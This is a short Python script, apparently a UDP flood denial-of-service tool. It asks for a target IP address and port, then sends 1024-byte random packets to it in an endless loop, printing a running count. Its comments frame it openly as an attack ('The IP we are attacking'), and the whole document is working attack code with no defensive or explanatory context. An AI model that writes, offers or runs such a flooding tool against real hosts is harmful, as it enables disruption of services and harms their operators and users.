import socket #Imports needed libraries
import random

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
bytes=random._urandom(1024) #Creates packet
ip = input('Target IP: ') #The IP we are attacking
port = input('Port: ') #Port we direct to attack
sent = 0
while 1: #Infinitely loops sending packets to the port until the program is exited.
    sock.sendto(bytes,(str(ip),int(port)))
    print("Sent:" + str(sent) + "  @  " + str(ip)  + ":" + str(port))
    sent += 1